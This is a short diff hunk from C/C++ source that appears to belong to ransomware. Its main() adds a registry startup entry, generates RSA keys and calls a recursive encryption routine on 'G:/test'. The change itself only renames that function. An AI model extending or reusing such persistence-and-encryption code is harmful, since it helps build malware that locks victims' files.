@@ -475,7 +475,7 @@ int main() {
 	RegCloseKey(addtostartup);
 	int encryptionmode = 1;
 	generateRSAkeys();
-	startRecursion("G:/test", encryptionmode);
+	start("G:/test", encryptionmode);
 
 	//if (intconnected == false) {
 	//just generate them on the client side... this is not good :|
